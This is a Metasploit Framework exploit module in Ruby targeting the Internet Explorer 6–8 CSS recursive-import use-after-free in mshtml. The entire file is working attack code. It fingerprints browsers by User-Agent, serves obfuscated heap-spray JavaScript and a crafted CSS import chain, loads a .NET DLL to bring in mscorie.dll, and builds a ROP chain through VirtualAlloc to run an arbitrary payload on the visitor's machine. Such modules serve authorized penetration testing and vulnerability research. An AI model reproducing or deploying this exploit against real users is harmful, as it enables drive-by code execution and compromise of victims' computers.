##
# $Id: ms11_xxx_ie_css_import.rb 11390 2010-12-21 19:24:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking # Need more love for Great

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "7.0", # Should be 6
		:ua_maxver  => "8.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:vuln_test  => nil, # no way to test without just trying it
	})

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer CSS Recursive Import Use After Free',
			'Description'    => %q{
					Thie module exploits a memory corruption vulnerability within Microsoft\'s
				HTML engine (mshtml). When parsing an HTML page containing a recursive CSS
				import, a C++ object is deleted and later reused. This leads to arbitrary
				code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'WooYun',         # Initial discovery / report
					'd0c_s4vage',     # First working public exploit
					'jduck'           # Metasploit module (ROP, @WTFuzz spray)
				],
			'Version'        => '$Revision: 11390 $',
			'References'     =>
				[
					#[ 'CVE', '2010-????' ],
					[ 'OSVDB', '69796' ],
					[ 'BID', '45246' ],
					#[ 'URL', 'http://www.microsoft.com/technet/security/advisory/XXXXXX.mspx' ],
					[ 'URL', 'http://www.wooyun.org/bugs/wooyun-2010-0885' ],
					[ 'URL', 'http://seclists.org/fulldisclosure/2010/Dec/110' ],
					[ 'URL', 'http://www.breakingpointsystems.com/community/blog/ie-vulnerability/' ]
					#[ 'MSB', 'MS11-XXX' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'InitialAutoRunScript' => 'migrate -f',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
					'DisableNops'   => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],

					[ 'Internet Explorer 8',
						{
							'Ret' => 0x105ae020,
							'OnePtrOff' => 0x18,
							'DerefOff' => 0x30,
							'FlagOff' => 0x54,
							'CallDeref1' => 0x20,
							'SignedOff' => 0x1c,
							'CallDeref2' => 0x24,
							'CallDeref3' => 0x00,
							'CallDeref4' => 0x20,
							'Deref4Off' => 0x08
						}
					],

					[ 'Internet Explorer 7',
						{
							'Ret' => 0x105ae020,
							'OnePtrOff' => 0x14,
							'DerefOff' => 0x5c,
							'FlagOff' => 0x34,
							'CallDeref1' => 0x1c,
							'SignedOff' => 0x18,
							'CallDeref2' => 0x20,
							'CallDeref3' => 0x00,
							'CallDeref4' => 0x20,
							'Deref4Off' => 0x08
						}
					],

					# For now, treat the IE6 target the same as teh debug target.
					[ 'Internet Explorer 6',
						{
							'Ret' => 0xc0c0c0c0,
							'OnePtrOff' => 0x14,
							'DerefOff' => 0x5c,
							'FlagOff' => 0x34,
							'CallDeref1' => 0x1c,
							'SignedOff' => 0x18,
							'CallDeref2' => 0x20,
							'CallDeref3' => 0x00,
							'CallDeref4' => 0x20,
							'Deref4Off' => 0x08
						}
					],

					[ 'Debug Target (Crash)',
						{
							'Ret' => 0xc0c0c0c0,
							'OnePtrOff' => 0,
							'DerefOff' => 4,
							'FlagOff' => 8,
							'CallDeref1' => 0xc,
							'SignedOff' => 0x10,
							'CallDeref2' => 0x14,
							'CallDeref3' => 0x18,
							'CallDeref4' => 0x1c,
							'Deref4Off' => 0x20
						}
					]
				],
			# Full-disclosure post was Dec 8th, original blog Nov 29th
			'DisclosureDate' => 'Nov 29 2010',
			'DefaultTarget'  => 0))
	end


	def auto_target(cli, request)
		mytarget = nil

		agent = request.headers['User-Agent']
		#print_status("Checking user agent: #{agent}")
		if agent =~ /MSIE 6\.0/
			mytarget = targets[3]
		elsif agent =~ /MSIE 7\.0/
			mytarget = targets[2]
		elsif agent =~ /MSIE 8\.0/
			mytarget = targets[1]
		else
			print_error("Unknown User-Agent #{agent} from #{cli.peerhost}:#{cli.peerport}")
		end
		mytarget
	end


	def on_request_uri(cli, request)

		print_status("Received request for %s" % request.uri.inspect)

		mytarget = target
		if target.name == 'Automatic'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		end

		buf_addr = mytarget.ret
		css_name = [buf_addr].pack('V') * (16 / 4)

		# We stick in a placeholder string to replace after UTF-16 encoding
		placeholder = "a" * (css_name.length / 2)
		uni_placeholder = Rex::Text.to_unicode(placeholder)

		if request.uri == get_resource() or request.uri =~ /\/$/
			print_status("Sending #{self.refname} redirect to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

			redir = get_resource()
			redir << '/' if redir[-1,1] != '/'
			redir << rand_text_alphanumeric(4+rand(4))
			redir << '.html'
			send_redirect(cli, redir)

		elsif request.uri =~ /\.html?$/
			# Re-generate the payload
			return if ((p = regenerate_payload(cli)) == nil)

			print_status("Sending #{self.refname} HTML to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

			# Generate the ROP payload
			rvas = rvas_mscorie_v2()
			rop_stack = generate_rop(buf_addr, rvas)
			fix_esp = rva2addr(rvas, 'leave / ret')
			ret     = rva2addr(rvas, 'ret')
			pivot1  = rva2addr(rvas, 'call [ecx+4] / xor eax, eax / pop ebp / ret 8')
			pivot2  = rva2addr(rvas, 'xchg eax, esp / mov eax, [eax] / mov [esp], eax / ret')

			# Append the payload to the rop_stack
			rop_stack << p.encoded

			# Build the deref-fest buffer
			len = 0x84 + rop_stack.length
			special_sauce = rand_text_alpha(len)

			# This ptr + off must contain 0x00000001
			special_sauce[mytarget['OnePtrOff'], 4] = [1].pack('V')

			# Pointer that is dereferenced to get the flag
			special_sauce[mytarget['DerefOff'], 4] = [buf_addr].pack('V')

			# Low byte must not have bit 1 set
			no_bit1 = rand(0xff) & ~2
			special_sauce[mytarget['FlagOff'], 1] = [no_bit1].pack('V')

			# These are deref'd to figure out what to call
			special_sauce[mytarget['CallDeref1'], 4] = [buf_addr].pack('V')
			special_sauce[mytarget['CallDeref2'], 4] = [buf_addr].pack('V')
			special_sauce[mytarget['CallDeref3'], 4] = [buf_addr + mytarget['Deref4Off']].pack('V')
			# Finally, this one becomes eip
			special_sauce[mytarget['CallDeref4'] + mytarget['Deref4Off'], 4] = [pivot1].pack('V')

			# This byte must be signed (shorter path to flow control)
			signed_byte = rand(0xff) | 0x80
			special_sauce[mytarget['SignedOff'], 1] = [signed_byte].pack('C')

			# These offsets become a fix_esp ret chain ..
			special_sauce[0x04, 4] = [pivot2].pack('V')    # part two of our stack pivot!
			special_sauce[0x0c, 4] = [buf_addr + 0x84 - 4].pack('V')  # becomes ebp, for fix esp
			special_sauce[0x10, 4] = [fix_esp].pack('V')   # our stack pivot ret's to this (fix_esp, from eax)

			# Add in the rest of the ROP stack
			special_sauce[0x84, rop_stack.length] = rop_stack

			# Format for javascript use
			special_sauce = Rex::Text.to_unescape(special_sauce)

			js_function  = rand_text_alpha(rand(100)+1)

			# Construct the javascript
			custom_js = <<-EOS
function #{js_function}() {
heap = new heapLib.ie(0x20000);
var heapspray = unescape("#{special_sauce}");
while(heapspray.length < 0x1000) heapspray += unescape("%u4444");
var heapblock = heapspray;
while(heapblock.length < 0x40000) heapblock += heapblock;
finalspray = heapblock.substring(2, 0x40000 - 0x21);
for(var counter = 0; counter < 500; counter++) { heap.alloc(finalspray); }
var vlink = document.createElement("link");
vlink.setAttribute("rel", "Stylesheet");
vlink.setAttribute("type", "text/css");
vlink.setAttribute("href", "#{placeholder}")
document.getElementsByTagName("head")[0].appendChild(vlink);
}
EOS
			opts = {
				'Symbols' => {
					'Variables' => %w{ heapspray vlink heapblock heap finalspray counter },
					'Methods'   => %w{ prepare }
				}
			}
			custom_js = ::Rex::Exploitation::ObfuscateJS.new(custom_js, opts)
			js = heaplib(custom_js)

			dll_uri = get_resource()
			dll_uri << '/' if dll_uri[-1,1] != '/'
			dll_uri << "generic-" + Time.now.to_i.to_s + ".dll"

			# Construct the final page
			html = <<-EOS
<html>
<head>
<script language='javascript'>
#{js}
</script>
</head>
<body onload='#{js_function}()'>
<object classid="#{dll_uri}#GenericControl">
</body>
</html>
EOS
			html = "\xff\xfe" + Rex::Text.to_unicode(html)
			html.gsub!(uni_placeholder, css_name)

			send_response(cli, html, { 'Content-Type' => 'text/html' })

		elsif request.uri =~ /\.dll$/
			print_status("Sending #{self.refname} DLL to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")
			# Generate a .NET v2.0 DLL, note that it doesn't really matter what this contains since we don't actually
			# use it's contents ...
			ibase = (0x2000 | rand(0x8000)) << 16
			dll = Msf::Util::EXE.to_dotnetmem(ibase, rand_text(16))

			# Send a .NET v2.0 DLL down
			send_response(cli, dll,
				{
					'Content-Type' => 'application/x-msdownload',
					'Connection'   => 'close',
					'Pragma'       => 'no-cache'
				})

		else
			css = <<-EOS
@import url("#{placeholder}");
@import url("#{placeholder}");
@import url("#{placeholder}");
@import url("#{placeholder}");
EOS
			css = "\xff\xfe" + Rex::Text.to_unicode(css)
			css.gsub!(uni_placeholder, css_name)

			print_status("Sending #{self.refname} CSS to #{cli.peerhost}:#{cli.peerport} (target: #{mytarget.name})...")

			send_response(cli, css, { 'Content-Type' => 'text/css' })

		end

		# Handle the payload
		handler(cli)

	end

	def rvas_mscorie_v2()
		# mscorie.dll version v2.0.50727.3053
		# Just return this hash
		{
			'call [ecx+4] / xor eax, eax / pop ebp / ret 8' => 0x237e,
			'xchg eax, esp / mov eax, [eax] / mov [esp], eax / ret' => 0x575b,
			'leave / ret'            => 0x25e5,
			'ret'                    => 0x25e5+1,
			'mov eax, [eax] / ret'   => 0x22a2,
			'mov [ecx], eax / xor eax, eax / pop esi / ret' => 0x360b9,

			'call [ecx] / pop ebp / ret 0xc' => 0x1ec4,
			'push eax / ret'         => 0x1d1e4,
			'pop eax / ret'          => 0x5ba1,
			'pop ebx / ret'          => 0x54c0,
			'pop ecx / ret'          => 0x1e13,
			'pop esi / ret'          => 0x1d9a,
			'pop edi / ret'          => 0x2212,
			'mov [ecx], eax / mov al, 1 / pop ebp / ret 0xc' => 0x61f6,
			'movsd / mov ebp, 0x458bffff / sbb al, 0x3b / ret' => 0x6154,
			'call [ecx]'             => 0x1ec4
		}
	end

	def generate_rop(buf_addr, rvas)
		# ROP fun! (XP SP3 English, Dec 15 2010)
		rvas.merge!({
			# Instructions / Name    => RVA
			'BaseAddress'            => 0x63f00000,
			'imp_VirtualAlloc'       => 0x10f4
		})

		rop_stack = [
			# Allocate an RWX memory segment
			'pop ecx / ret',
			'imp_VirtualAlloc',

			'call [ecx] / pop ebp / ret 0xc',
			0,         # lpAddress
			0x1000,    # dwSize
			0x3000,    # flAllocationType
			0x40,      # flProt
			:unused,

			# Copy the original payload
			'pop ecx / ret',
			:unused,
			:unused,
			:unused,
			:memcpy_dst,

			'mov [ecx], eax / mov al, 1 / pop ebp / ret 0xc',
			:unused,
			
			'pop esi / ret',
			:unused,
			:unused,
			:unused,
			:memcpy_src,

			'pop edi / ret',
			0xdeadf00d # to be filled in above
		]
		(0x200 / 4).times {
			rop_stack << 'movsd / mov ebp, 0x458bffff / sbb al, 0x3b / ret'
		}
		# Execute the payload ;)
		rop_stack << 'call [ecx]'

		rop_stack.map! { |e|
			if e.kind_of? String
				# Meta-replace (RVA)
				raise RuntimeError, "Unable to locate key: \"#{e}\"" if not rvas[e]
				rvas['BaseAddress'] + rvas[e]

			elsif e == :unused
				# Randomize
				rand_text(4).unpack('V').first

			elsif e == :memcpy_src
				# Based on stack length..
				buf_addr + 0x84 + (rop_stack.length * 4)

			elsif e == :memcpy_dst
				# Store our new memory ptr into our buffer for later popping :)
				buf_addr + 0x84 + (21 * 4)

			else
				# Literal
				e
			end
		}

		rop_stack.pack('V*')
	end

	def rva2addr(rvas, key)
		raise RuntimeError, "Unable to locate key: \"#{key}\"" if not rvas[key]
		rvas['BaseAddress'] + rvas[key]
	end

end
